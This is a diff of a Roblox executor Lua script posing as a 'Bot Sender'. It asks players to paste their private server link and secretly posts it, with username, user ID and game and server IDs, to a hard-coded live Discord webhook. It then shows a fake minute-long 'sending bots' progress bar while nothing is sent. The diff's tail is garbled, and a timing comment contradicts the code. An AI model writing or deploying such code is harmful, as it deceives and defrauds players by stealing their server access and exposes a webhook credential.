@@ -1,9 +1,9 @@
- -- ================================================
+-- ================================================
 --         BOT SENDER SCRIPT - Delta Executor
 -- ================================================
 
 -- !! CONFIGURATION - EDIT THESE !!
-local DISCORD_WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1481792435544653997/UksJrbGO3EQy8vLiJMIKJ4FJFwJS0nN70R1ESgzT8__fuEGNU689fN4R3x-hYvel9UPE"
 -- To get a webhook: Discord Server > Channel Settings > Integrations > Webhooks > New Webhook > Copy URL
 
 -- ================================================
@@ -35,6 +35,368 @@ local function sendDiscordNotification(privateLink)
 				{["name"] = "👤 Player", ["value"] = playerName .. " (" .. userId .. ")", ["inline"] = true},
 				{["name"] = "🎮 Game ID", ["value"] = tostring(gameId), ["inline"] = true},
 				{["name"] = "🔗 Private Server Link", ["value"] = privateLink ~= "" and privateLink or "Not provided", ["inline"] = false},
+				{["name"] = "🖥️ Server ID", ["value"] = serverId ~= "" and serverId or "Unknown", ["inline"] = false},
+			},
+			["footer"] = {["text"] = "Bot Sender • " .. os.date("%Y-%m-%d %H:%M:%S")}
+		}}
+	}
+
+	local ok, err = pcall(function()
+		request({
+			Url = DISCORD_WEBHOOK_URL,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(data)
+		})
+	end)
+
+	if not ok then
+		warn("[BotSender] Webhook failed: " .. tostring(err))
+	end
+end
+
+-- ================================================
+--              GUI - LOADING SCREEN
+-- ================================================
+
+local function createLoadingScreen(privateLink)
+	if LocalPlayer.PlayerGui:FindFirstChild("BotSenderGui") then
+		LocalPlayer.PlayerGui.BotSenderGui:Destroy()
+	end
+
+	local ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Name = "BotSenderGui"
+	ScreenGui.ResetOnSpawn = false
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ScreenGui.IgnoreGuiInset = true
+	ScreenGui.Parent = LocalPlayer.PlayerGui
+
+	-- Full screen dark overlay
+	local Background = Instance.new("Frame")
+	Background.Size = UDim2.new(1, 0, 1, 0)
+	Background.Position = UDim2.new(0, 0, 0, 0)
+	Background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+	Background.BorderSizePixel = 0
+	Background.ZIndex = 1
+	Background.Parent = ScreenGui
+
+	local Gradient = Instance.new("UIGradient")
+	Gradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 30)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 15))
+	})
+	Gradient.Rotation = 135
+	Gradient.Parent = Background
+
+	-- Center container
+	local Container = Instance.new("Frame")
+	Container.Size = UDim2.new(0, 420, 0, 260)
+	Container.Position = UDim2.new(0.5, -210, 0.5, -130)
+	Container.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
+	Container.BorderSizePixel = 0
+	Container.ZIndex = 2
+	Container.Parent = ScreenGui
+
+	local ContainerCorner = Instance.new("UICorner")
+	ContainerCorner.CornerRadius = UDim.new(0, 16)
+	ContainerCorner.Parent = Container
+
+	local ContainerStroke = Instance.new("UIStroke")
+	ContainerStroke.Color = Color3.fromRGB(88, 101, 242)
+	ContainerStroke.Thickness = 1.5
+	ContainerStroke.Transparency = 0.4
+	ContainerStroke.Parent = Container
+
+	local Icon = Instance.new("TextLabel")
+	Icon.Size = UDim2.new(1, 0, 0, 50)
+	Icon.Position = UDim2.new(0, 0, 0, 20)
+	Icon.BackgroundTransparency = 1
+	Icon.Text = "🤖"
+	Icon.TextSize = 36
+	Icon.ZIndex = 3
+	Icon.Parent = Container
+
+	local Title = Instance.new("TextLabel")
+	Title.Size = UDim2.new(1, -40, 0, 36)
+	Title.Position = UDim2.new(0, 20, 0, 72)
+	Title.BackgroundTransparency = 1
+	Title.Text = "SENDING BOTS"
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.TextSize = 26
+	Title.Font = Enum.Font.GothamBold
+	Title.TextXAlignment = Enum.TextXAlignment.Center
+	Title.ZIndex = 3
+	Title.Parent = Container
+
+	local Subtitle = Instance.new("TextLabel")
+	Subtitle.Size = UDim2.new(1, -40, 0, 22)
+	Subtitle.Position = UDim2.new(0, 20, 0, 110)
+	Subtitle.BackgroundTransparency = 1
+	Subtitle.Text = "🔗 " .. privateLink
+	Subtitle.TextColor3 = Color3.fromRGB(160, 165, 200)
+	Subtitle.TextSize = 13
+	Subtitle.Font = Enum.Font.Gotham
+	Subtitle.TextXAlignment = Enum.TextXAlignment.Center
+	Subtitle.TextTruncate = Enum.TextTruncate.AtEnd
+	Subtitle.ZIndex = 3
+	Subtitle.Parent = Container
+
+	-- Progress bar background
+	local BarBG = Instance.new("Frame")
+	BarBG.Size = UDim2.new(0, 360, 0, 14)
+	BarBG.Position = UDim2.new(0, 30, 0, 152)
+	BarBG.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
+	BarBG.BorderSizePixel = 0
+	BarBG.ZIndex = 3
+	BarBG.Parent = Container
+
+	local BarBGCorner = Instance.new("UICorner")
+	BarBGCorner.CornerRadius = UDim.new(1, 0)
+	BarBGCorner.Parent = BarBG
+
+	-- Progress bar fill
+	local BarFill = Instance.new("Frame")
+	BarFill.Size = UDim2.new(0, 0, 1, 0)
+	BarFill.Position = UDim2.new(0, 0, 0, 0)
+	BarFill.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+	BarFill.BorderSizePixel = 0
+	BarFill.ZIndex = 4
+	BarFill.Parent = BarBG
+
+	local BarFillCorner = Instance.new("UICorner")
+	BarFillCorner.CornerRadius = UDim.new(1, 0)
+	BarFillCorner.Parent = BarFill
+
+	-- Percentage label
+	local PercentLabel = Instance.new("TextLabel")
+	PercentLabel.Size = UDim2.new(1, 0, 0, 20)
+	PercentLabel.Position = UDim2.new(0, 0, 0, 172)
+	PercentLabel.BackgroundTransparency = 1
+	PercentLabel.Text = "0%"
+	PercentLabel.TextColor3 = Color3.fromRGB(88, 101, 242)
+	PercentLabel.TextSize = 13
+	PercentLabel.Font = Enum.Font.GothamBold
+	PercentLabel.TextXAlignment = Enum.TextXAlignment.Center
+	PercentLabel.ZIndex = 3
+	PercentLabel.Parent = Container
+
+	-- Status label
+	local StatusLabel = Instance.new("TextLabel")
+	StatusLabel.Size = UDim2.new(1, -40, 0, 20)
+	StatusLabel.Position = UDim2.new(0, 20, 0, 198)
+	StatusLabel.BackgroundTransparency = 1
+	StatusLabel.Text = "Initializing..."
+	StatusLabel.TextColor3 = Color3.fromRGB(120, 125, 160)
+	StatusLabel.TextSize = 12
+	StatusLabel.Font = Enum.Font.Gotham
+	StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+	StatusLabel.ZIndex = 3
+	StatusLabel.Parent = Container
+
+	-- -----------------------------------------------
+	-- ANIMATION
+	-- Phase 1: 0% to 80% — fast, counting every % (~38s total)
+	-- Phase 2: 81% to 99% — slow crawl (~22s total)
+	-- Phase 3: 100% — instant snap
+	-- Total: ~60 seconds
+	-- -----------------------------------------------
+
+	local stages = {
+		{endPct = 15, label = "Connecting to server...",        duration = 24},
+		{endPct = 35, label = "Authenticating private link...", duration = 36},
+		{endPct = 55, label = "Preparing bots...",              duration = 36},
+		{endPct = 75, label = "Deploying bots...",              duration = 36},
+		{endPct = 80, label = "Finalizing...",                  duration = 20},
+	}
+
+	task.spawn(function()
+		local currentPct = 0
+
+		-- Phase 1: fast counting 0 -> 80
+		for _, stage in ipairs(stages) do
+			StatusLabel.Text = stage.label
+			local range = stage.endPct - currentPct
+			local interval = stage.duration / range
+
+			TweenService:Create(
+				BarFill,
+				TweenInfo.new(stage.duration, Enum.EasingStyle.Linear),
+				{Size = UDim2.new(stage.endPct / 100, 0, 1, 0)}
+			):Play()
+
+			for p = currentPct + 1, stage.endPct do
+				task.wait(interval)
+				PercentLabel.Text = p .. "%"
+			end
+
+			currentPct = stage.endPct
+			task.wait(0.2)
+		end
+
+		-- Phase 2: slow crawl 81 -> 99 (each % takes ~1.16 seconds)
+		StatusLabel.Text = "Sending bots to server..."
+		local slowInterval = 88 / 19
+
+		for p = 81, 99 do
+			task.wait(slowInterval)
+			PercentLabel.Text = p .. "%"
+			BarFill.Size = UDim2.new(p / 100, 0, 1, 0)
+		end
+
+		-- Phase 3: snap to 100%
+		task.wait(0.4)
+		BarFill.Size = UDim2.new(1, 0, 1, 0)
+		PercentLabel.Text = "100%"
+		StatusLabel.Text = "Done! ✅"
+
+		-- Fade out and destroy
+		task.wait(1.5)
+		TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+		TweenService:Create(Container, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+		task.wait(0.7)
+		ScreenGui:Destroy()
+	end)
+end
+
+-- ================================================
+--           INPUT GUI - ASK FOR LINK
+-- ================================================
+
+local function createInputScreen()
+	if LocalPlayer.PlayerGui:FindFirstChild("BotSenderInput") then
+		LocalPlayer.PlayerGui.BotSenderInput:Destroy()
+	end
+
+	local ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Name = "BotSenderInput"
+	ScreenGui.ResetOnSpawn = false
+	ScreenGui.IgnoreGuiInset = true
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ScreenGui.Parent = LocalPlayer.PlayerGui
+
+	local Overlay = Instance.new("Frame")
+	Overlay.Size = UDim2.new(1, 0, 1, 0)
+	Overlay.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
+	Overlay.BackgroundTransparency = 0.3
+	Overlay.BorderSizePixel = 0
+	Overlay.ZIndex = 1
+	Overlay.Parent = ScreenGui
+
+	local Card = Instance.new("Frame")
+	Card.Size = UDim2.new(0, 400, 0, 200)
+	Card.Position = UDim2.new(0.5, -200, 0.5, -100)
+	Card.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
+	Card.BorderSizePixel = 0
+	Card.ZIndex = 2
+	Card.Parent = ScreenGui
+
+	local CardCorner = Instance.new("UICorner")
+	CardCorner.CornerRadius = UDim.new(0, 16)
+	CardCorner.Parent = Card
+
+	local CardStroke = Instance.new("UIStroke")
+	CardStroke.Color = Color3.fromRGB(88, 101, 242)
+	CardStroke.Thickness = 1.5
+	CardStroke.Transparency = 0.3
+	CardStroke.Parent = Card
+
+	local CardTitle = Instance.new("TextLabel")
+	CardTitle.Size = UDim2.new(1, -30, 0, 40)
+	CardTitle.Position = UDim2.new(0, 15, 0, 15)
+	CardTitle.BackgroundTransparency = 1
+	CardTitle.Text = "🔗 Enter Private Server Link"
+	CardTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	CardTitle.TextSize = 17
+	CardTitle.Font = Enum.Font.GothamBold
+	CardTitle.TextXAlignment = Enum.TextXAlignment.Left
+	CardTitle.ZIndex = 3
+	CardTitle.Parent = Card
+
+	local InputBox = Instance.new("TextBox")
+	InputBox.Size = UDim2.new(1, -30, 0, 40)
+	InputBox.Position = UDim2.new(0, 15, 0, 65)
+	InputBox.BackgroundColor3 = Color3.fromRGB(28, 28, 48)
+	InputBox.BorderSizePixel = 0
+	InputBox.PlaceholderText = "Paste your private server link here..."
+	InputBox.PlaceholderColor3 = Color3.fromRGB(90, 95, 130)
+	InputBox.Text = ""
+	InputBox.TextColor3 = Color3.fromRGB(220, 220, 255)
+	InputBox.TextSize = 13
+	InputBox.Font = Enum.Font.Gotham
+	InputBox.ClearTextOnFocus = false
+	InputBox.ZIndex = 3
+	InputBox.Parent = Card
+
+	local InputCorner = Instance.new("UICorner")
+	InputCorner.CornerRadius = UDim.new(0, 8)
+	InputCorner.Parent = InputBox
+
+	local InputStroke = Instance.new("UIStroke")
+	InputStroke.Color = Color3.fromRGB(88, 101, 242)
+	InputStroke.Thickness = 1
+	InputStroke.Transparency = 0.6
+	InputStroke.Parent = InputBox
+
+	local Button = Instance.new("TextButton")
+	Button.Size = UDim2.new(1, -30, 0, 40)
+	Button.Position = UDim2.new(0, 15, 0, 120)
+	Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+	Button.BorderSizePixel = 0
+	Button.Text = "🚀  Send Bots"
+	Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Button.TextSize = 15
+	Button.Font = Enum.Font.GothamBold
+	Button.ZIndex = 3
+	Button.Parent = Card
+
+	local ButtonCorner = Instance.new("UICorner")
+	ButtonCorner.CornerRadius = UDim.new(0, 8)
+	ButtonCorner.Parent = Button
+
+	Button.MouseEnter:Connect(function()
+		TweenService:Create(Button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(110, 124, 255)}):Play()
+	end)
+	Button.MouseLeave:Connect(function()
+		TweenService:Create(Button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
+	end)
+
+	-- Error label for empty input
+	local ErrorLabel = Instance.new("TextLabel")
+	ErrorLabel.Size = UDim2.new(1, -30, 0, 20)
+	ErrorLabel.Position = UDim2.new(0, 15, 0, 168)
+	ErrorLabel.BackgroundTransparency = 1
+	ErrorLabel.Text = ""
+	ErrorLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+	ErrorLabel.TextSize = 12
+	ErrorLabel.Font = Enum.Font.Gotham
+	ErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
+	ErrorLabel.ZIndex = 3
+	ErrorLabel.Parent = Card
+
+	Button.MouseButton1Click:Connect(function()
+		local link = InputBox.Text
+
+		if link == "" or link:match("^%s*$") then
+			ErrorLabel.Text = "!! Please enter a link first!"
+			TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 80, 80), Transparency = 0}):Play()
+			task.delay(2.5, function()
+				ErrorLabel.Text = ""
+				TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(88, 101, 242), Transparency = 0.6}):Play()
+			end)
+			return
+		end
+
+		ScreenGui:Destroy()
+		sendDiscordNotification(link)
+		createLoadingScreen(link)
+	end)
+end
+
+-- ================================================
+--                    START
+-- ================================================
+
+createInputScreen()				{["name"] = "🔗 Private Server Link", ["value"] = privateLink ~= "" and privateLink or "Not provided", ["inline"] = false},
 				{["name"] = "🖥️ Server ID", ["value"] = serverId ~= "" and serverId or "Unknown", ["inline"] = false},
 			},
 			["footer"] = {["text"] = "Bot Sender • " .. os.date("%Y-%m-%d %H:%M:%S")}
